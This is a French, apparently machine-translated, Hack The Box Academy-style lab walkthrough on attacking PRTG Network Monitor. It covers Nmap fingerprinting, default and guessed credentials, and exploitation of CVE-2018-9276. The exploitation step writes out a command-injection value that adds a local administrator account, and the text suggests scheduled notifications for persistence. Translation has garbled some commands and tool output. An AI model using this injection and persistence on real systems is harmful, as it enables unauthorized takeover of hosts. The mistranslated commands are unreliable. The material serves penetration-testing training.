Moniteur réseau PRTG
====================

* * * * *

[PRTG Network Monitor](https://www.paessler.com/prtg) est un logiciel de surveillance de réseau sans agent. Il peut être utilisé pour surveiller l'utilisation de la bande passante, la disponibilité et collecter des statistiques à partir de divers hôtes, notamment des routeurs, des commutateurs, des serveurs, etc. La première version de PRTG est sortie en 2003. En 2015, une version gratuite de PRTG est sortie, limitée à 100 capteurs pouvant être utilisés pour surveiller jusqu'à 20 hôtes. Il fonctionne avec un mode de découverte automatique pour analyser les zones d'un réseau et créer une liste de périphériques. Une fois cette liste créée, elle peut collecter des informations supplémentaires à partir des périphériques détectés à l'aide de protocoles tels que ICMP, SNMP, WMI, NetFlow, etc. Les appareils peuvent également communiquer avec l'outil via une API REST. Le logiciel fonctionne entièrement à partir d'un site Web basé sur AJAX, mais il existe une application de bureau disponible pour Windows, Linux et macOS. Quelques données intéressantes sur PRTG :

- Selon l'entreprise, il est utilisé par 300 000 utilisateurs dans le monde
- La société qui fabrique l'outil, Paessler, crée des solutions de surveillance depuis 1997
- Certaines organisations qui utilisent PRTG pour surveiller leurs réseaux incluent l'aéroport international de Naples, Virginia Tech, 7-Eleven et [plus](https://www.paessler.com/company/casestudies)

Au fil des ans, PRTG a souffert de [26 vulnérabilités](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) qui se sont vu attribuer des CVE. Parmi tous ceux-ci, seuls quatre ont des PoC d'exploit publics faciles à trouver, deux scripts intersites (XSS), un déni de service et une vulnérabilité d'injection de commande authentifiée que nous aborderons dans cette section. Il est rare de voir PRTG exposé à l'extérieur, mais nous avons souvent rencontré PRTG lors de tests d'intrusion internes. La boîte de publication hebdomadaire HTB [Netmon](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html) présente PRTG.

* * * * *

Découverte/empreinte/énumération
----------------------------------

On peut rapidement découvrir PRTG à partir d'un scan Nmap. Il se trouve généralement sur les ports Web courants tels que 80, 443 ou 8080. Il est possible de modifier le port de l'interface Web dans la section Configuration lorsque vous êtes connecté en tant qu'administrateur.

```
dsgsec@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50

À partir de Nmap 7.80 ( https://nmap.org ) au 2021-09-22 15:41 EDT
Statistiques : 0:00:00 écoulé ; 0 hôtes terminés (1 up), 1 en cours d'analyse furtive SYN
Synchronisation de l'analyse furtive SYN : environ 0,06 % effectué
Rapport d'analyse Nmap pour 10.129.201.50
L'hôte est actif (latence de 0,11 s).
Non illustré : 65492 ports fermés, 24 ports filtrés
Certains ports fermés peuvent être signalés comme filtrés en raison de --defeat-rst-ratelimit
VERSION SERVICE À L'ÉTAT DU PORT
80/tcp ouvert http Microsoft IIS httpd 10.0
135/tcp ouvert msrpc Microsoft Windows RPC
139/tcp ouvert netbios-ssn Microsoft Windows netbios-ssn
445/tcp ouvrir microsoft-ds ?
3389/tcp open ms-wbt-server Microsoft Terminal Services
5357/tcp ouvert http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp ouvert http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp ouvrir ssl/http Splunkd httpd
8080/tcp open http Indy httpd 17.3.33.2830 (moniteur de bande passante Paessler PRTG)
8089/tcp ouvrir ssl/http Splunkd httpd
47001/tcp ouvert http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp ouvrir msrpc Microsoft Windows RPC
49665/tcp ouvrir msrpc Microsoft Windows RPC
49666/tcp ouvrir msrpc Microsoft Windows RPC
49667/tcp ouvrir msrpc Microsoft Windows RPC
49668/tcp ouvrir msrpc Microsoft Windows RPC
49669/tcp ouvrir msrpc Microsoft Windows RPC
49676/tcp ouvrir msrpc Microsoft Windows RPC
49677/tcp ouvrir msrpc Microsoft Windows RPC
Informations sur le service : système d'exploitation : Windows ; CPE : cpe:/o:microsoft:windows

Détection de service effectuée. Veuillez signaler tout résultat incorrect sur https://nmap.org/submit/ .
Nmap terminé : 1 adresse IP (1 hôte actif) scannée en 97,17 secondes

```

À partir de l'analyse Nmap ci-dessus, nous pouvons voir le service `Indy httpd 17.3.33.2830 (Moniteur de bande passante Paessler PRTG)` détecté sur le port 8080.

PRTG apparaît également dans l'analyse EyeWitness que nous avons effectuée précédemment. Ici, nous pouvons voir qu'EyeWitness répertorie les identifiants par défaut `prtgadmin:prtgadmin`. Ils sont généralement pré-remplis sur la page de connexion, et nous les retrouvons souvent inchangés. Les scanners de vulnérabilité tels que Nessus disposent également de [plugins](https://www.tenable.com/plugins/nessus/51874) qui détectent la présence de PRTG.

![image](https://academy.hackthebox.com/storage/modules/113/prtg_eyewitness.png)

Une fois que nous avons découvert PRTG, nous pouvons confirmer en accédant à l'URL et la page de connexion s'affiche.

![](https://academy.hackthebox.com/storage/modules/113/prtg_login.png)

D'après l'énumération que nous avons effectuée jusqu'à présent, il semble qu'il s'agisse de la version PRTG `17.3.33.2830` et est probablement vulnérable à [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018- 9276) qui est une injection de commande authentifiée dans la console Web PRTG System Administrator pour PRTG Network Monitor avant la version 18.2.39. Sur la base de la version rapportée par Nmap, nous pouvons supposer que nous avons affaire à une version vulnérable. En utilisant `cURL` nous pouvons voir que le numéro de version est bien `17.3.33.283`.

```
dsgsec@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible ; MSIE 7.01 ; Windows NT 5.0)" | grep version

   <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="impression,écran,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors" >Nouvelle version 21.3.70 de PRTG avec de nouveaux capteurs Azure, HPE et Redfish</a></h3><p>Il y a peu de temps, je vous ai présenté la version 21.3.69 de PRTG, avec un tas de nouveaux capteurs, et maintenant la prochaine version est prête à être installée. Et cette version est également livrée avec de toutes nouvelles choses !</p></div>
     <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>

```

Notre première tentative de connexion avec les informations d'identification par défaut échoue, mais quelques tentatives plus tard, nous sommes avec `prtgadmin:Password123`.

![](https://academy.hackthebox.com/storage/modules/113/prtg_logged_in.png)

* * * * *

Tirer parti des vulnérabilités connues
--------------------------------

Une fois connecté, nous pouvons explorer un peu, mais nous savons que cela est probablement vulnérable à une faille d'injection de commande, alors allons-y. Cet excellent [article de blog](https://www.codewatch.org/blog/?p=453) par la personne qui a découvert cette faille fait un excellent travail pour parcourir le processus de découverte initial et comment il l'a découverte. Lors de la création d'une nouvelle notification, le champ `Paramètre` est transmis directement dans un script PowerShell sans aucun type de nettoyage des entrées.

Pour commencer, passez la souris sur `Configuration` en haut à droite, puis sur le menu `Paramètres du compte` et enfin cliquez sur `Notifications`.

![](https://academy.hackthebox.com/storage/modules/113/prtg_notifications.png)

Cliquez ensuite sur `Ajouter une nouvelle notification`.

![](https://academy.hackthebox.com/storage/modules/113/prtg_add.png)

Donnez un nom à la notification, faites défiler vers le bas et cochez la case à côté de "EXÉCUTER LE PROGRAMME". Sous `Program File`, sélectionnez `Demo exe notification - outfile.ps1` dans le menu déroulant. Enfin, dans le champ paramètre, saisissez une commande. Pour nos besoins, nous allons ajouter un nouvel utilisateur administrateur local en saisissant `test.txt;net user prtgadm1 Pwn3d_by_PRTG ! /add;net administrateurs du groupe local prtgadm1 /add`. Lors d'une évaluation réelle, nous pouvons vouloir faire quelque chose qui ne change pas le système, comme obtenir une coque inversée ou une connexion à notre C2 préféré. Enfin, cliquez sur le bouton `Enregistrer` .

![image](https://academy.hackthebox.com/storage/modules/113/prtg_execute.png)

Après avoir cliqué sur `Enregistrer`, nous serons redirigés vers la page `Notifications` et verrons notre nouvelle notification nommée `pwn` dans la liste.

![](https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png)

Maintenant, nous aurions pu planifier l'exécution de la notification (et exécuter notre commande) ultérieurement lors de sa configuration. Cela pourrait s'avérer utile en tant que mécanisme de persistance lors d'un engagement à long terme et mérite d'être noté. Les horaires peuvent être modifiés dans le menu des paramètres du compte si nous voulons le configurer pour qu'il s'exécute à une heure précise chaque jour pour récupérer notre connexion ou quelque chose de cette nature. À ce stade, il ne vous reste plus qu'à cliquer sur le bouton `Test` pour exécuter notre notification et exécuter la commande pour ajouter un utilisateur administrateur local. Après avoir cliqué sur `Tester` , une fenêtre contextuelle s'affiche : `La notification EXE est en file d'attente`. Si nous recevons un message d'erreur ici, nous pouvons revenir en arrière et revérifier les paramètres de notification.

Puisqu'il s'agit d'une exécution de commande aveugle, nous n'obtiendrons aucun retour, nous devrons donc soit vérifier notre écouteur pour une connexion en retour, soit, dans notre cas, vérifier si nous pouvons nous authentifier auprès de l'hôte en tant qu'administrateur local. . Nous pouvons utiliser `CrackMapExec` pour confirmer l'accès de l'administrateur local. Nous pourrions également essayer de RDP à la boîte, accéder via WinRM ou utiliser un outil tel que [evil-winrm](https://github.com/Hackplayers/evil-winrm) ou quelque chose de [impacket](https: //github.com/SecureAuthCorp/impacket) tel que `wmiexec.py` ou `psexec.py`.

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG !

SMB 10.129.201.50 445 APP03 [*] Windows 10.0 Build 17763 (nom : APP03) (domaine : APP03) (signature : Faux) (SMBv1 : Faux)
PME 10.129.201.50 445 APP03 [+] APP03\prtgadm1:Pwn3d_by_PRTG ! (Pwn3d !)

```

Et nous confirmons l'accès administrateur local sur la cible ! Parcourez l'exemple et reproduisez vous-même toutes les étapes sur le système cible. Mettez-vous au défi d'exploiter également la vulnérabilité d'injection de commande pour obtenir une connexion shell inversée à partir de la cible.

* * * * *

À partir de
-------

Maintenant que nous avons couvert Splunk et PRTG, passons à autre chose et discutons de certains outils courants de gestion du service client et de gestion de la configuration et voyons comment nous pouvons en abuser lors de nos engagements.